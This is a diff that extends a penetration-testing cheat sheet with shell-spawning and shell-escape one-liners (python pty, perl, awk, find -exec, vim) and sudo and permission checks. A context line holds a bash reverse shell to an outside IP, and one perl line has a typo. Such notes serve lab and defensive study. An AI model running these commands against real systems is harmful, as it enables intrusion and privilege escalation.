@@ -171,3 +171,51 @@ bash -i >& /dev/tcp/10.10.15.71/1337 0>&1
 
 python3 -m http.server 8000
 ```
+
+## Spawning interactive shells
+
+```sh
+# /bin/sh -i
+/bin/sh -i
+sh: no job control in this shell
+sh-4.2$
+
+# python
+python -c 'import pty; pty.spawn("/bin/sh")' 
+
+# perl
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh"; # should be run from a script.
+
+# Ruby
+ruby: exec "/bin/sh"  # should be run from a script.
+
+# Lua
+lua: os.execute('/bin/sh') # should be run from a script.
+
+#AWK
+awk 'BEGIN {system("/bin/sh")}'
+
+# Find 
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+# Using Exec To Launch A Shell
+find . -exec /bin/sh \; -quit
+
+# Vim To Shell
+vim -c ':!/bin/sh'
+
+# Vim Escape
+:set shell=/bin/sh
+:shell
+```
+
+## Execution permissions
+### File Permission
+```
+ls -la <path/to/fileorbinary>
+```
+### sudo permissions
+```
+sudo -l
+```
